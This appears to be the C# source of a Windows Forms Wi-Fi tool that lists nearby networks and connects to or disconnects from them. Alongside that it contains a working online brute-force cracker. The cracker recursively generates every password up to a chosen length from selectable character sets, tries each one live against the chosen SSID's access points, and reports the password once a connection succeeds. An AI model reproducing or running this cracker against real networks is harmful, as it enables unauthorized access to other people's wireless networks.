using SimpleWifi.Win32;
using SimpleWifi.Win32.Interop;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace SimpleWifi
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        WlanClient client = new WlanClient();
        Wifi wifi = new Wifi();

        private void Form1_Load(object sender, EventArgs e)
        {
            listView1.Columns[0].Width = 177;
            listView1.Columns[1].Width = 60;
            listView1.Columns[2].Width = 60;
            listView1.Columns[3].Width = 81;
            listView1.Columns[4].Width = 91;
            listView1.Columns[5].Width = 132;

            chars = calculateChars();

            /*listView1.Columns[0].Text = "SSID";
            listView1.Columns[1].Text = "Signal";
            listView1.Columns[2].Text = "Channel";
            listView1.Columns[3].Text = "HasProfile";
            listView1.Columns[4].Text = "IsConnected";
            listView1.Columns[5].Text = "IsSecure";*/

            foreach (WlanInterface wlanIface in client.Interfaces)
            {
                wlanIface.Scan();
                listBox1.Items.Add(wlanIface.InterfaceDescription);
                listBox1.SelectedIndex = listBox1.Items.Count - 1;
            }
            /*foreach (AccessPoint ap in wifi.GetAccessPoints())
            {
                ListViewItem li = new ListViewItem();
                li.Text = ap.Name;
                li.SubItems.Add(ap.SignalStrength.ToString());
                li.SubItems.Add(ap.Interface.Channel.ToString());
                li.SubItems.Add(ap.HasProfile.ToString());
                li.SubItems.Add(ap.IsConnected.ToString());
                li.SubItems.Add(ap.IsSecure.ToString());
                if (selectedSSID == li.Text)
                {
                    li.Selected = true;
                }
                if (connectedSSID == li.Text)
                {
                    li.ForeColor = Color.White;
                    li.BackColor = Color.Green;
                }
                else
                {
                    li.ForeColor = Color.Black;
                    li.BackColor = Color.LightCyan;
                }
                listView1.Items.Add(li);
            }*/
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (checkBox1.Checked)
                {
                    listView1.Items.Clear();
                    if (listBox1.SelectedItem != null)
                    {
                        WlanInterface wlanIface = client.Interfaces.Where(s => s.InterfaceDescription.Equals(listBox1.SelectedItem.ToString())).First();
                        try
                        {
                            if (wlanIface.InterfaceState == WlanInterfaceState.Connected)
                            {
                                connectedSSID = wlanIface.CurrentConnection.profileName;
                                label1.Text = "Current connection: " + connectedSSID + " " + wlanIface.CurrentConnection.isState;
                                button3.Enabled = true;
                            }
                            else
                            {
                                connectedSSID = string.Empty;
                                label1.Text = "Current connection: " + wlanIface.InterfaceState;
                                button3.Enabled = false;
                            }
                        }
                        catch {
                            connectedSSID = string.Empty;
                            label1.Text = "Current connection: " + wlanIface.InterfaceState;
                            button3.Enabled = false;
                        }
                        
                        wlanIface.Scan();

                        WlanAvailableNetwork[] networks = wlanIface.GetAvailableNetworkList(WlanGetAvailableNetworkFlags.IncludeAllAdhocProfiles);
                        foreach (WlanAvailableNetwork network in networks.GroupBy(x => GetStringForSSID(x.dot11Ssid)).Select(y => y.First()).OrderByDescending(r => r.wlanSignalQuality))
                        {
                            ListViewItem li = new ListViewItem();
                            li.Text = GetStringForSSID(network.dot11Ssid);
                            li.SubItems.Add(network.networkConnectable.ToString());
                            li.SubItems.Add(network.wlanSignalQuality.ToString());
                            li.SubItems.Add(network.dot11DefaultCipherAlgorithm.ToString());
                            li.SubItems.Add(network.dot11DefaultAuthAlgorithm.ToString());
                            li.SubItems.Add(network.securityEnabled.ToString());

                            try
                            {
                                WlanProfileInfo[] wpi = wlanIface.GetProfiles().Where(s => s.profileName.Equals(li.Text)).ToArray();
                                li.Tag = (wpi.Length > 0 && wlanIface.InterfaceState != WlanInterfaceState.Connected) ? "true" : "false";
                            }
                            catch {
                                li.Tag = "false";
                            }
                            

                            if(selectedSSID == li.Text)
                            {
                                li.Selected = true;
                                if(li.Tag.ToString() == "true")
                                {
                                    button2.Enabled = true;
                                }
                                else
                                {
                                    button2.Enabled = false;
                                }
                            }

                            if(connectedSSID == li.Text)
                            {
                                li.ForeColor = Color.White;
                                li.BackColor = Color.Green;
                            }
                            else
                            {
                                li.ForeColor = Color.Black;
                                li.BackColor = Color.LightCyan;
                            }
                            listView1.Items.Add(li);
                        }
                    }

                    /*foreach (AccessPoint ap in wifi.GetAccessPoints())
                    {
                        ListViewItem li = new ListViewItem();
                        li.Text = ap.Name;
                        li.SubItems.Add(ap.SignalStrength.ToString());
                        li.SubItems.Add(ap.Interface.Channel.ToString());
                        li.SubItems.Add(ap.HasProfile.ToString());
                        li.SubItems.Add(ap.IsConnected.ToString());
                        li.SubItems.Add(ap.IsSecure.ToString());
                        if (selectedSSID == li.Text)
                        {
                            li.Selected = true;
                        }
                        if (connectedSSID == li.Text)
                        {
                            li.ForeColor = Color.White;
                            li.BackColor = Color.Green;
                        }
                        else
                        {
                            li.ForeColor = Color.Black;
                            li.BackColor = Color.LightCyan;
                        }
                        listView1.Items.Add(li);
                    }*/
                }

            }
            catch
            {

            }
        }
        static string GetStringForSSID(Dot11Ssid ssid)
        {
            return Encoding.UTF8.GetString(ssid.SSID, 0, (int)ssid.SSIDLength);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
            foreach (WlanInterface wlanIface in client.Interfaces)
            {
                wlanIface.Scan();
                listBox1.Items.Add(wlanIface.InterfaceDescription);
                listBox1.SelectedIndex = listBox1.Items.Count - 1;
            }
        }

        string selectedSSID = string.Empty;
        string connectedSSID = string.Empty;

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0 && listView1.SelectedItems[0].Text != null)
                {
                    selectedSSID = listView1.SelectedItems[0].Text;
                    if (listView1.SelectedItems[0].Tag.ToString() == "true")
                    {
                        button2.Enabled = true;
                    }
                    else
                    {
                        button2.Enabled = false;
                    }
                }
                else
                {
                    selectedSSID = string.Empty;
                }
            }
            catch {
                selectedSSID = string.Empty;
            }

            
        }
        private void button3_Click(object sender, EventArgs e)
        {
            try
            {
                WlanInterface wlanIface = client.Interfaces.Where(s => s.InterfaceDescription.Equals(listBox1.SelectedItem.ToString())).First();
                wlanIface.Disconnect();
            }
            catch { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0 && listView1.SelectedItems[0].Text != null)
                {
                    AccessPoint AP = wifi.GetAccessPoints().Where(ap => ap.Name.Equals(listView1.SelectedItems[0].Text)).First();
                    AuthRequest authRequest = new AuthRequest(AP);
                    AP.ConnectAsync(authRequest);
                    listView1.SelectedItems[0].Selected = false;
                    button2.Enabled = false;
                }
                
            }
            catch { 
            
            }
        }

        private string calculateChars()
        {
            string result = string.Empty;
            if (checkBox2.Checked) result += "abcdefghijklmnopqrstuvwxyz";
            if (checkBox3.Checked) result += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            if (checkBox4.Checked) result += "0123456789";
            if (checkBox5.Checked) result += @"$@^`,|%;.~()/\{}:?[]=-+_#!";
            return result;
        }


        string chars = string.Empty;
        string target = string.Empty;
        List<AccessPoint> APs = new List<AccessPoint>();
        bool running = false;
        bool paused = false;
        Stopwatch stopwatch = new Stopwatch();

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            chars = calculateChars();
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            chars = calculateChars();
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            chars = calculateChars();
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            chars = calculateChars();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {

            label4.Text = "Characters count: " + chars.Length;
            if(target == string.Empty)
            {
                button4.Text = "Load target";
            }
            else
            {
                button4.Text = "Unload target";
            }
            label6.Text = (target != string.Empty) ? "SSID: " + target : "SSID: --";
            label7.Text = (APs.Count > 0) ? "AccessPoints: " + APs.Count : "AccessPoints: --";
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if(button4.Text == "Load target")
            {
                if(listView1.SelectedItems.Count > 0)
                {
                    target = listView1.SelectedItems[0].Text;
                    APs = new List<AccessPoint>();
                    foreach (WlanInterface wlanIface in client.Interfaces)
                    {
                        WlanAvailableNetwork[] rawNetworks = wlanIface.GetAvailableNetworkList(0);
                        List<WlanAvailableNetwork> networks = new List<WlanAvailableNetwork>();

                        // Remove network entries without profile name if one exist with a profile name.
                        foreach (WlanAvailableNetwork network in rawNetworks)
                        {
                            bool hasProfileName = !string.IsNullOrEmpty(network.profileName);
                            bool anotherInstanceWithProfileExists = rawNetworks.Where(n => n.Equals(network) && !string.IsNullOrEmpty(n.profileName)).Any();

                            if ((!anotherInstanceWithProfileExists || hasProfileName) && GetStringForSSID(network.dot11Ssid) == target)
                            {
                                networks.Add(network);
                            }
                                
                        }
                        foreach (WlanAvailableNetwork network in networks)
                        {
                            APs.Add(new AccessPoint(wlanIface, network));
                        }
                    }
                }
            }
            else
            {
                target = string.Empty;
                APs = new List<AccessPoint>();
            }
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            if (running)
            {
                button5.Text = "Stop";
            }
            else
            {
                button5.Text = "Start";
            }

            

            if (paused)
            {
                button6.Text = "Resume";
            }
            else
            {
                button6.Text = "Pause";
            }

            if (running && APs.Count > 0)
            {
                button6.Enabled = true;
            }
            else
            {
                button6.Enabled = false;
            }

            if (APs.Count > 0)
            {
                button5.Enabled = true;
            }
            else
            {
                button5.Enabled = false;
            }

            //button5.Update();
            //button6.Update();

            if (!running)
            {
                label8.Text = "State: --";
            }else if (running && !paused)
            {
                label8.Text = "State: running";
            }
            else if (running && paused)
            {
                label8.Text = "State: paused";
            }


            TimeSpan ts = stopwatch.Elapsed;
            label10.Text = string.Format("Elapsed time: {0:D2}:{1:D2}:{2:D2}:{3:D2}", ts.Days, ts.Hours, ts.Minutes, ts.Seconds);

            if (backgroundWorker1.IsBusy)
            {
                label12.Text = "Worker: running";
            }
            else
            {
                label12.Text = "Worker: not_running";
            }

            label13.Text = "Checked: " + total.ToString();
            label14.Text = "Current: " + current_wd;
            label15.Text = (all > 0) ? "Percentage: " + (total * 100 / all).ToString("F") + "%" : "Percentage: 0%";
            label16.Text = "All: " + all.ToString();

            if (!running)
            {
                checkBox2.Enabled = true;
                checkBox3.Enabled = true;
                checkBox4.Enabled = true;
                checkBox5.Enabled = true;
                textBox1.Enabled = true;
                numericUpDown1.Enabled = true;
            }
            else
            {
                checkBox2.Enabled = false;
                checkBox3.Enabled = false;
                checkBox4.Enabled = false;
                checkBox5.Enabled = false;
                textBox1.Enabled = false;
                numericUpDown1.Enabled = false;
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            if(button5.Text == "Start")
            {
                
                button4.Enabled = false;
                stopwatch.Restart();
                total = 0;
                all = 0;

                starting_point = textBox1.Text;
                current_wd = string.Empty;
                maxlength = (int)numericUpDown1.Value;

                for (int i = starting_point.Length + 1; i <= maxlength; i++)
                {
                    all = (i == starting_point.Length + 1) ? chars.Length : all * chars.Length;
                }

                double x = 0;
                for (int i = starting_point.Length + 1; i < maxlength; i++)
                {
                    x = (i == starting_point.Length + 1) ? chars.Length : x * chars.Length;
                    all += x;
                }

                
                running = true;
                backgroundWorker1.RunWorkerAsync();
            }
            else
            {
                stopwatch.Stop();
                running = false;
                paused = false;
                button4.Enabled = true;
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            if (button6.Text == "Pause")
            {
                paused = true;
                stopwatch.Stop();
            }
            else
            {
                stopwatch.Start();
                paused = false;
            }
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            do
            {
                if (!paused)
                {
                    Dive(starting_point, starting_point.Length);
                    running = false;
                    stopwatch.Stop();
                }
                System.Threading.Thread.Sleep(1);
            } while (running);
        }

        int maxlength = 8;
        double total = 0;
        string current_wd = string.Empty;
        string starting_point = string.Empty;
        double all = 0;
        
        private void Dive(string prefix, int level)
        {
            level += 1;
            foreach (char c in chars)
            {
                if (!running) break;
                do
                {
                    System.Threading.Thread.Sleep(1);
                } while (paused);

                total++;
                current_wd = prefix + c;

                try
                {
                    double mod = total % APs.Count;
                    AccessPoint selectedAp = APs.ElementAt((int)(mod));
                    processOperation(selectedAp, current_wd);
                }
                catch { }
                

                if (level < maxlength)
                {
                    Dive(prefix + c, level);
                }
            }
        }

        private void processOperation(AccessPoint ap, string str)
        {
            AuthRequest authRequest = new AuthRequest(ap);
            authRequest.Password = str;
            //ap.ConnectAsync(authRequest, true, OnConnectedComplete, str);
            if(ap.Connect(authRequest, true))
            {
                MessageBox.Show("Wifi Password has found: " + str);
                running = false;
                stopwatch.Stop();
            }
        }

        private void OnConnectedComplete(bool success, string password)
        {
            if (success)
            {
                MessageBox.Show("Wifi Password has found: " + password);
                running = false;
                stopwatch.Stop();
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            //maxlength = textBox1.Text.Length + 1;
            numericUpDown1.Value = textBox1.Text.Length + 1;
        }

        private void label10_Click(object sender, EventArgs e)
        {

        }
    }
}
